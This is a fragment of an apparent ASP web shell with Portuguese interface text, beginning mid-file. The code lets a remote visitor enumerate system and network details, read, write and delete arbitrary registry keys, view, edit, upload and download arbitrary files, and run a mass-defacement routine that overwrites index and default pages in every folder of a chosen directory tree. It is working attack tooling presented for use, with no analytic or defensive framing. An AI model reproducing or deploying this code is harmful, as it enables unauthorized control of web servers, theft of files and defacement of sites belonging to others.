WshShell.Environment("SYSTEM")\n\t\tResponse.Write "<br><font face=arial size=2>"\n\t\tResponse.Write "<b>IDENTIFICA\xc7\xc3O DE REDE:</b><br>"\n\t\tResponse.Write "<b>Usu\xe1rio: </b>" & WshNetwork.UserName & "<br>"\n\t\tResponse.Write "<b>Nome do Computador: </b>" & WshNetwork.ComputerName & "<br>"\n\t\tResponse.Write "<b>Usu\xe1rio do Dom\xednio: </b>" & WshNetwork.UserDomain & "<br>"\n\t\tSet Drives = WshNetwork.EnumNetworkDrives\n\t\tFor i = 0 to Drives.Count - 1\n\t\t\tResponse.Write "<b>Drive de Rede (Mapeado): </b>" & Drives.Item(i) & "<br>"\n\t\tNext\n\t\tResponse.Write "<br><b>F\xcdSICO:</b><br>"\n\t\tResponse.Write "<b>Arquitetura do Processador: </b>" & WshEnv("PROCESSOR_ARCHITECTURE") & "<br>"\n\t\tResponse.Write "<b>N\xfamero de Processadores: </b>" & WshEnv("NUMBER_OF_PROCESSORS") & "<br>"\n\t\tResponse.Write "<b>Identificador do Processador: </b>" & WshEnv("PROCESSOR_IDENTIFIER") & "<br>"\n\t\tResponse.Write "<b>N\xedvel do Processador: </b>" & WshEnv("PROCESSOR_LEVEL") & "<br>"\n\t\tResponse.Write "<b>Revis\xe3o do Processador: </b>" & WshEnv("PROCESSOR_REVISION") & "<br>"\n\t\tResponse.Write "<br><b>L\xd3GICO:</b><br>"\n\t\tResponse.Write "<b>IP: </b>" & request.servervariables("LOCAL_ADDR") & "<br>"\n\t\tResponse.Write "<b>Sistema Operacional: </b>" & WshEnv("OS") & "<br>"\n\t\tResponse.Write "<b>Servidor Web: </b>" & request.servervariables("SERVER_SOFTWARE") & "<br>"\n\t\tResponse.Write "<b>Especifica\xe7\xe3o do Command: </b>" & WshShell.ExpandEnvironmentStrings("%ComSpec%") & "<br>"\n\t\tResponse.Write "<b>Caminhos no Path: </b>" & WshEnv("PATH") & "<br>"\n\t\tResponse.Write "<b>Execut\xe1veis: </b>" & WshEnv("PATHEXT") & "<br>"\n\t\tResponse.Write "<b>Prompt: </b> " & WshEnv("PROMPT") & "<br>"\n\t\tResponse.Write "<b>System Drive: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%") & "<br>"\n\t\tResponse.Write "<b>System Root: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMROOT%") & "<br>"\n\t\tResponse.Write "<b>Caminho do System32: </b>" & WshShell.CurrentDirectory & "<br>"\n\t\tSet Drives = Nothing\n\t\tSet WshNetwork = Nothing\n\t\tSet WshShell = Nothing\n\t\tSet WshEnv = Nothing\n\tCase "reg"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tSet WshShell = Server.CreateObject("WScript.Shell")\n\t\tResponse.Write "<font face=""arial"" size=""2""><b>Editor de Registro:</b><br><br>"\n\t\tSelect Case Trim(Request.QueryString("regaction"))\n\t\t\tCase "w"\n\t\t\t\tIf Trim(Request.QueryString("process")) = "yes" Then\n\t\t\t\t\tSelect Case Trim(Request.QueryString("type"))\n\t\t\t\t\t\tCase "1"\n\t\t\t\t\t\t\tteste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_SZ")\n\t\t\t\t\t\tCase "2"\n\t\t\t\t\t\t\tteste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_DWORD")\n\t\t\t\t\t\tCase "3"\n\t\t\t\t\t\t\tteste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_BINARY")\n\t\t\t\t\t\tCase "4"\n\t\t\t\t\t\t\tteste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_EXPAND_SZ")\n\t\t\t\t\t\tCase "5"\n\t\t\t\t\t\t\tteste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_MULTI_SZ")\n\t\t\t\t\tEnd Select\n\t\t\t\t\tResponse.Write "<center><br><font face=""arial"" size=""2"">Registro <b>"\n\t\t\t\t\tResponse.Write Trim(Request.QueryString("key")) & "</b> Escrito</center>"\n\t\t\t\t\tResponse.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"\n\t\t\t\tElse\n\t\t\t\t\tResponse.Write "<table><tr><td><font face=""arial"" size=""2"">ROOT KEY NAME</td><td><font face=""arial"" size=""2"">ABREVIA\xc7\xc3O</td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_USER </td><td><font face=""arial"" size=""1""> HKCU </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">HKEY_LOCAL_MACHINE </td><td><font face=""arial"" size=""1""> HKLM </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CLASSES_ROOT </td><td><font face=""arial"" size=""1""> HKCR </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">HKEY_USERS </td><td><font face=""arial"" size=""1""> HKEY_USERS </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_CONFIG </td><td><font face=""arial"" size=""1""> HKEY_CURRENT_CONFIG </td></tr></table><br>"\n\t\t\t\t\tResponse.Write "<table><tr><td><font face=""arial"" size=""2"">Tipo </td><td><font face=""arial"" size=""2""> Descri\xe7\xe3o </td><td><font face=""arial"" size=""2""> Na forma de </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">REG_SZ </td><td><font face=""arial"" size=""1""> string </td><td><font face=""arial"" size=""1""> string </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">REG_DWORD </td><td><font face=""arial"" size=""1""> n\xfamero </td><td><font face=""arial"" size=""1""> inteiro </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">REG_BINARY </td><td><font face=""arial"" size=""1""> valor bin\xe1rio </td><td><font face=""arial"" size=""1""> VBArray de inteiros </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">REG_EXPAND_SZ </td><td><font face=""arial"" size=""1""> string expand\xedvel (ex. ""%windir%\\\\calc.exe"") </td><td><font face=""arial"" size=""1""> string </td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">REG_MULTI_SZ </td><td><font face=""arial"" size=""1""> array de strings </td><td><font face=""arial"" size=""1""> VBArray de strings </td></tr></table>"\n\t\t\t\t\tResponse.Write "<br><br><FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"\n\t\t\t\t\tResponse.Write "<table><tr><td><font face=""arial"" size=""1"">KEY: </td><td><input type=""text"" name=""key""> <font face=""arial"" size=""1""><br>( ex.: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ProductId )</td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">VALUE:</td><td><input type=""text"" name=""value""></td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""1"">TYPE:</td><td><SELECT NAME=""type"">"\n\t\t\t\t\tResponse.Write "<OPTION VALUE=""1"">REG_SZ </option>"\n\t\t\t\t\tResponse.Write "<OPTION VALUE=""2"">REG_DWORD </option>"\n\t\t\t\t\tResponse.Write "<OPTION VALUE=""3"">REG_BINARY </option>"\n\t\t\t\t\tResponse.Write "<OPTION VALUE=""4"">REG_EXPAND_SZ </option>"\n\t\t\t\t\tResponse.Write "<OPTION VALUE=""5"">REG_MULTI_SZ </option></select><br>"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""regaction"" value=""w"">"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""action"" value=""reg"">"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""process"" value=""yes""></td></tr>"\n\t\t\t\t\tResponse.Write "<tr><td></td><td><input type=""submit"" value=""OK""></form></td></tr></table>"\n\t\t\t\t\tResponse.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"\n\t\t\t\tEnd If\n\t\t\tCase "r"\n\t\t\t\tIf Trim(Request.QueryString("process")) = "yes" Then\n\t\t\t\t\tResponse.Write "<font face=""arial"" size=""2"">" & Trim(Request.QueryString("key")) & "<br>"\n\t\t\t\t\tResponse.Write "Valor: <b>" & WshShell.RegRead (Trim(Request.QueryString("key")))\n\t\t\t\tElse\n\t\t\t\t\tResponse.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"\n\t\t\t\t\tResponse.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> <br>( ex.: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ProductId )<br>"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""regaction"" value=""r"">"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""action"" value=""reg"">"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""process"" value=""yes"">"\n\t\t\t\t\tResponse.Write "<input type=""submit"" value=""OK""></form>"\n\t\t\t\tEnd If\n\t\t\t\tResponse.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"\n\t\t\tCase "d"\n\t\t\t\tIf Trim(Request.QueryString("process")) = "yes" Then\n\t\t\t\t\tteste = WshShell.RegDelete (Trim(Request.QueryString("key")))\n\t\t\t\t\tResponse.Write "Chave <b>" & Trim(Request.QueryString("key")) & " </b>deletada"\n\t\t\t\tElse\n\t\t\t\t\tResponse.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"\n\t\t\t\t\tResponse.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> ( ex.: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ProductId )<br>"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""regaction"" value=""d"">"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""action"" value=""reg"">"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""process"" value=""yes"">"\n\t\t\t\t\tResponse.Write "<input type=""submit"" value=""OK""></form>"\n\t\t\t\tEnd If\n\t\t\t\tResponse.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"\n\t\t\tCase Else\n\t\t\t\tResponse.Write "<font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=w"">ESCREVER CHAVE</a><br><br>"\n\t\t\t\tResponse.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=r"">LER CHAVE</a><br><br>"\n\t\t\t\tResponse.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=d"">DELETAR CHAVE</a><br>"\n\t\tEnd Select\n\t\tSet WshShell = Nothing\n\tCase "txtview"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp & "<font face=""arial"" size=""2"">"\n\t\tfile = Replace(Trim(Request.QueryString("file")),"|","\\")\n\t\tSet fso = CreateObject("Scripting.FileSystemObject")  \n\t\tSet a = fso.OpenTextFile(file)\n\t\tResponse.Write Replace(Replace(Server.HTMLEncode(a.ReadAll),VbCrLf,"<br>")," ","&nbsp;")\n\t\tSet a = Nothing\n\t\tSet fso = Nothing\n\tCase "txtedit"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tIf Request.Form.Count = 0 Then\n\t\t\tfile = Replace(Trim(Request.QueryString("file")),"|","\\")\n\t\t\tSet fso = CreateObject("Scripting.FileSystemObject")\n\t\t\tSet a = fso.OpenTextFile(file)\n\t\t\tResponse.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"\n\t\t\tResponse.Write "<textarea cols=\'85\' rows=\'25\' name=""content"" wrap=""physical"" >" & Server.HTMLEncode(a.ReadAll) & "</textarea><br>"\n\t\t\tResponse.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("file")) & """>"\n\t\t\tResponse.Write "<input type=""submit"" name=""savemethod"" value=""Save"">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=""submit"" name=""savemethod"" value=""Save as""></form>"\n\t\t\tSet a = Nothing\n\t\t\tSet fso = Nothing\n\t\tElse\n\t\t\tSelect Case Trim(Request.Form("savemethod"))\n\t\t\t\tCase "Save"\n\t\t\t\t\tSet fso = CreateObject("Scripting.FileSystemObject")\n\t\t\t\t\tnovotexto = Trim(Request.Form("content"))\n\t\t\t\t\tnovotexto = Split(novotexto,vbCrLf)\n\t\t\t\t\tSet objstream = fso.OpenTextFile(Replace(Trim(Request.Form("path")),"|","\\"),2)\n\t\t\t\t\tFor i = 0 To UBound(novotexto)\n\t\t\t\t\t\tobjstream.WriteLine(novotexto(i))\n\t\t\t\t\tNext\n\t\t\t\t\tobjstream.Close\n\t\t\t\t\tSet objstream = Nothing\n\t\t\t\t\tResponse.Write "Texto salvo: <b>" & Replace(Trim(Request.Form("path")),"|","\\") & "</b>"\n\t\t\t\tCase "Save as"\n\t\t\t\t\tSet fso = CreateObject("Scripting.FileSystemObject")\n\t\t\t\t\tnovotexto = Trim(Request.Form("content"))\n\t\t\t\t\tnovotexto = Split(novotexto,vbCrLf)\n\t\t\t\t\tcaminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\\")) & "rhtemptxt.txt"\n\t\t\t\t\tSet objstream = fso.CreateTextFile(caminho,true,false)\n\t\t\t\t\tFor i = 0 To UBound(novotexto)\n\t\t\t\t\t\tobjstream.WriteLine(novotexto(i))\n\t\t\t\t\tNext\n\t\t\t\t\tobjstream.Close\n\t\t\t\t\tSet objstream = Nothing\n\t\t\t\t\tResponse.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"\n\t\t\t\t\tResponse.Write "<input type=""text"" name=""filename"" value=""" & showobj(Replace(Trim(Request.Form("path")),"|","\\")) & """><br>"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.Form("path")) & """>"\n\t\t\t\t\tResponse.Write "<input type=""submit"" name=""savemethod2"" value=""Save""></form>"\n\t\t\t\tCase Else\n\t\t\t\t\tcaminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\\")) & "rhtemptxt.txt"\n\t\t\t\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\t\t\t\tSet MyFile = ObjFSO.GetFile(caminho)\n\t\t\t\t\tdestino = Left(caminho,InStrRev(caminho,"\\")) & Trim(Request.Form("filename"))\n\t\t\t\t\tMyFile.Move (destino)\n\t\t\t\t\tIf Err.Number = 0 Then\n\t\t\t\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><center><br><br>Arquivo: <b>" & destino & "</b> salvo!"\n\t\t\t\t\t\tResponse.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"\n\t\t\t\t\tEnd If\t\n\t\t\tEnd Select\n\t\tEnd If\n\tCase "download"\n\t\tResponse.Buffer = True\n\t\tResponse.Clear\n\t\tstrFileName = Replace(Trim(Request.QueryString("file")),"|","\\")\n\t\tstrFile = Right(strFileName, Len(strFileName) - InStrRev(strFileName,"\\"))\n\t\tstrFileType = Request.QueryString("type")\n\t\tif strFileType = "" then strFileType = "application/download"\n\t\tSet fso = Server.CreateObject("Scripting.FileSystemObject")\n\t\tSet f = fso.GetFile(strFilename)\n\t\tintFilelength = f.size\n\t\tSet f = Nothing\n\t\tSet fso = Nothing\n\t\tResponse.AddHeader "Content-Disposition", "attachment; filename=" & strFile\n\t\tResponse.AddHeader "Content-Length", intFilelength\n\t\tResponse.Charset = "UTF-8"\n\t\tResponse.ContentType = strFileType\n\t\tSet Stream = Server.CreateObject("ADODB.Stream")\n\t\tStream.Open\n\t\tStream.type = 1\n\t\tStream.LoadFromFile strFileName\n\t\tResponse.BinaryWrite Stream.Read\n\t\tResponse.Flush\n\t\tStream.Close\n\t\tSet Stream = Nothing\n\tCase "upload"\n\t\tIf Request.QueryString("processupload") <> "yes" Then\n\t\t\tResponse.Write "<FORM METHOD=""POST"" ENCTYPE=""multipart/form-data"" ACTION=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=upload&processupload=yes&path=" & Request.QueryString("path") & """>"\n\t\t\tResponse.Write "<TABLE BORDER=0>"\n\t\t\tResponse.Write "<tr><td><font face=""arial"" size=""2""><b>Select a file to upload:</b><br><INPUT TYPE=FILE SIZE=50 NAME=""FILE1""></td></tr>"\n\t\t\tResponse.Write "<tr><td align=""center""><font face=""arial"" size=""2""><INPUT TYPE=SUBMIT VALUE=""Upload!""></td></tr>"\n\t\t\tResponse.Write "</TABLE>"\n\t\tElse\n\t\t\tSet Uploader = New FileUploader\n\t\t\tUploader.Upload()\n\t\t\tIf Uploader.Files.Count = 0 Then\n\t\t\t\tResponse.Write "File(s) not uploaded."\n\t\t\tElse\n\t\t\t\tFor Each File In Uploader.Files.Items\n\t\t\t\t\tFile.SaveToDisk Replace(Trim(Request.QueryString("path")),"|","\\")\n\t\t\t\t\tResponse.Write "File Uploaded: " & File.FileName & "<br>"\n\t\t\t\t\tResponse.Write "Size: " & File.FileSize & " bytes<br>"\n\t\t\t\t\tResponse.Write "Type: " & File.ContentType & "<br><br>"\n\t\t\t\t\tResponse.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"\n\t\t\t\tNext\n\t\t\tEnd If\n\t\tEnd If\n\tCase "mass"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tSub themassdeface(caminhodomass,metodo,ObjFSO,MeuArquivo)\n\t\t\tOn Error Resume Next\n\t\t\tSet MonRep = ObjFSO.GetFolder(caminhodomass)\n\t\t\tSet ColFolders = MonRep.SubFolders\n\t\t\tfor each folderItem in ColFolders\n\t\t\t\tdestino1 = folderItem.path & "\\index.htm"\n\t\t\t\tdestino2 = folderItem.path & "\\index.html"\n\t\t\t\tdestino3 = folderItem.path & "\\index.asp"\n\t\t\t\tdestino4 = folderItem.path & "\\index.cfm"\n\t\t\t\tdestino5 = folderItem.path & "\\index.php"\n\t\t\t\tdestino6 = folderItem.path & "\\default.htm"\n\t\t\t\tdestino7 = folderItem.path & "\\default.html"\n\t\t\t\tdestino8 = folderItem.path & "\\default.asp"\n\t\t\t\tdestino9 = folderItem.path & "\\default.cfm"\n\t\t\t\tdestino10 = folderItem.path & "\\default.php"\n\t\t\t\tMeuArquivo.Copy(destino1)\n\t\t\t\tMeuArquivo.Copy(destino2)\n\t\t\t\tMeuArquivo.Copy(destino3)\n\t\t\t\tMeuArquivo.Copy(destino4)\n\t\t\t\tMeuArquivo.Copy(destino5)\n\t\t\t\tMeuArquivo.Copy(destino6)\n\t\t\t\tMeuArquivo.Copy(destino7)\n\t\t\t\tMeuArquivo.Copy(destino8)\n\t\t\t\tMeuArquivo.Copy(destino9)\n\t\t\t\tMeuArquivo.Copy(destino10)\n\t\t\t\tResponse.Write "<table><tr><td><font face=\'arial\' size=\'2\'>&lt;DIR&gt; " & folderItem.path & "</td>"\n\t\t\t\tIf Err.Number = 0 Then\n\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'green\'>DONE!</font></td></tr>"\n\t\t\t\tElse\n\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'red\'>" & UCase(Err.Description) & "</font></td></tr></table>"\n\t\t\t\tEnd If\n\t\t\t\tErr.Number = 0\n\t\t\t\tResponse.Flush\n\t\t\t\tIf metodo = "brute" Then\n\t\t\t\t\tCall themassdeface(folderItem.path & "\\","brute",ObjFSO,MeuArquivo)\n\t\t\t\tEnd If\n\t\t\tnext\n\t\tEnd Sub\n\t\tSub brutemass(caminho,massaction)\n\t\t\tIf massaction = "test" Then\n\t\t\t\tOn Error Resume Next\n\t\t\t\tSet MonRep = ObjFSO.GetFolder(caminho)\n\t\t\t\tSet ColFolders = MonRep.SubFolders\n\t\t\t\tSet ColFiles0 = MonRep.Files\n\t\t\t\tfor each folderItem in ColFolders\n\t\t\t\t\tSet TotalFolders = ObjFSO.GetFolder(folderItem.path)\n\t\t\t\t\tSet EachFolder = TotalFolders.SubFolders\n\t\t\t\t\tResponse.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"\n\t\t\t\t\tmaindestino = folderItem.path & "\\"\n\t\t\t\t\tMeuArquivo.Copy(maindestino)\n\t\t\t\t\tResponse.Write "<tr><td><b><font face=\'arial\' size=\'2\'>&lt;DIR&gt; " & maindestino & "</b></td>"\n\t\t\t\t\tIf Err.Number = 0 Then\n\t\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'green\'>Acesso Permitido</font></td></tr>"\n\t\t\t\t\tElse\n\t\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'red\'>" & UCase(Err.Description) & "</font></td></tr>"\n\t\t\t\t\tEnd If\n\t\t\t\t\tErr.Number = 0\n\t\t\t\t\tResponse.Flush\n\t\t\t\t\tIf EachFolder.count > 0 Then\n\t\t\t\t\t\tmasscontador = 0\n\t\t\t\t\t\tfor each subpasta in EachFolder\n\t\t\t\t\t\t\tmasscontador = masscontador + 1\n\t\t\t\t\t\t\tdestino = subpasta.path & "\\"\n\t\t\t\t\t\t\tIf masscontador = 1 Then\n\t\t\t\t\t\t\t\tdestinofinal = destino\n\t\t\t\t\t\t\t\tpathfinal = subpasta.path\n\t\t\t\t\t\t\t\tErr.Number = 0\n\t\t\t\t\t\t\t\tMeuArquivo.Copy(destinofinal)\n\t\t\t\t\t\t\t\tResponse.Write "<tr><td><font face=\'arial\' size=\'2\'>&lt;DIR&gt; " & showobj(pathfinal) & "</td>"\n\t\t\t\t\t\t\t\tIf Err.Number = 0 Then\n\t\t\t\t\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'green\'>Acesso Permitido</font></td></tr>"\n\t\t\t\t\t\t\t\tElse\n\t\t\t\t\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'red\'>" & UCase(Err.Description) & "</font></td></tr>"\n\t\t\t\t\t\t\t\tEnd If\n\t\t\t\t\t\t\t\tErr.Number = 0\n\t\t\t\t\t\t\t\tResponse.Flush\n\t\t\t\t\t\t\tElse\n\t\t\t\t\t\t\t\tMeuArquivo.Copy(destino)\n\t\t\t\t\t\t\t\tResponse.Write "<tr><td><font face=\'arial\' size=\'2\'>&lt;DIR&gt; " & showobj(subpasta.path) & "</td>"\n\t\t\t\t\t\t\t\tIf Err.Number = 0 Then\n\t\t\t\t\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'green\'>Acesso Permitido</font></td></tr>"\n\t\t\t\t\t\t\t\tElse\n\t\t\t\t\t\t\t\t\tResponse.Write "<td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'2\' color=\'red\'>" & UCase(Err.Description) & "</font></td></tr>"\n\t\t\t\t\t\t\t\tEnd If\n\t\t\t\t\t\t\t\tErr.Number = 0\n\t\t\t\t\t\t\t\tResponse.Flush\n\t\t\t\t\t\t\tEnd If\n\t\t\t\t\t\tnext\n\t\t\t\t\t\tmasscontador = 0\n\t\t\t\t\tEnd If\n\t\t\t\t\tResponse.Write "</table><br>"\n\t\t\t\t\tCall brutemass(folderItem.path & "\\","test")\n\t\t\t\tnext\n\t\t\t\tSet MonRep = Nothing\n\t\t\t\tSet ColFolders = Nothing\n\t\t\t\tSet ColFiles0 = Nothing\n\t\t\tElse\n\t\t\t\tIf Request.Form.Count = 0 Then\n\t\t\t\t\tResponse.Write "<font face=""arial"" size=""2""><br><br><b>Brute:</b> copia os arquivos do deface para todas as pastas e subpastas (todos os n\xedveis) do diret\xf3rio escolhido (mais demorado). O tempo do deface vai variar de acordo com o numero TOTAL de diret\xf3rios.<br><br>"\n\t\t\t\t\tResponse.Write "<b>Single:</b> copia os arquivos do deface apenas para as pastas (primeiro n\xedvel) do diret\xf3rio escolhido. N\xe3o inclui subpastas.<br><br>"\n\t\t\t\t\tResponse.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=dfc"">"\n\t\t\t\t\tResponse.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("path")) & """>"\n\t\t\t\t\tResponse.Write "<center><font face=""arial"" size=""2"">Insira o c\xf3digo:<br>"\n\t\t\t\t\tResponse.Write "<textarea cols=\'65\' rows=\'15\' name=""content""></textarea><br>"\n\t\t\t\t\tResponse.Write "<input type=""radio"" name=""massopt"" value=""brute"" checked>Brute&nbsp;&nbsp;&nbsp;"\n\t\t\t\t\tResponse.Write "<input type=""radio"" name=""massopt"" value=""single"">Single<br>"\n\t\t\t\t\tResponse.Write "<input type=""submit"" value=""w00t!""></center>"\n\t\t\t\t\tResponse.Write "</form>"\n\t\t\t\tElse\n\t\t\t\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\t\t\t\tpatharquivotxt = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\\"))\n\t\t\t\t\tarquivomassdfc = patharquivotxt & "teste.txt"\n\t\t\t\t\tSet Arquivotxt = ObjFso.OpenTextFile(arquivomassdfc, 2, True, False)\n\t\t\t\t\tvetordelinhas = Split(Request.Form("content"),VbCrLf)\n\t\t\t\t\tFor i = 0 To UBound(vetordelinhas)\n\t\t\t\t\t\tArquivotxt.WriteLine(vetordelinhas(i))\n\t\t\t\t\tNext\n\t\t\t\t\tSet MeuArquivo = ObjFSO.GetFile(arquivomassdfc)\n\t\t\t\t\t\n\t\t\t\t\tIf Request.Form("massopt") = "single" Then\n\t\t\t\t\t\tCall themassdeface(caminho,"single",ObjFSO,MeuArquivo)\n\t\t\t\t\tElseIf Request.Form("massopt") = "brute" Then\n\t\t\t\t\t\tCall themassdeface(caminho,"brute",ObjFSO,MeuArquivo)\n\t\t\t\t\tEnd If\n\t\t\t\tEnd If\n\t\t\tEnd If\n\t\tEnd Sub\n\t\tIf Trim(Request.QueryString("massact")) = "test" Then\n\t\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\t\tpatharquivotxt = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\\"))\n\t\t\tarquivo = patharquivotxt & "_vti_cnf.log"\n\t\t\tSet Arquivotxt = ObjFSO.CreateTextFile(arquivo,True)\n\t\t\tSet MeuArquivo = ObjFSO.GetFile(arquivo)\n\t\t\tCall brutemass(Replace(Trim(Request.QueryString("path")),"|","\\"),"test")\n\t\tElseIf Trim(Request.QueryString("massact")) = "dfc" Then\n\t\t\tCall brutemass(Replace(Trim(Request.Form("path")),"|","\\"),"dfc")\n\t\tEnd If\n\tCase Else\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tCall showcontent()\nEnd Select\nIf Err.Number <> 0 Then\n\tResponse.Write "<br><font face=\'arial\' size=\'2\'>ERRO: " & Err.Number & "<br><br><b>" & UCase(Err.Description) & "</b><br>Acesse o <b>ONLINE HELP</b> para a explica\xe7\xe3o do erro"\nEnd If\nResponse.Write endcode\n%>\n'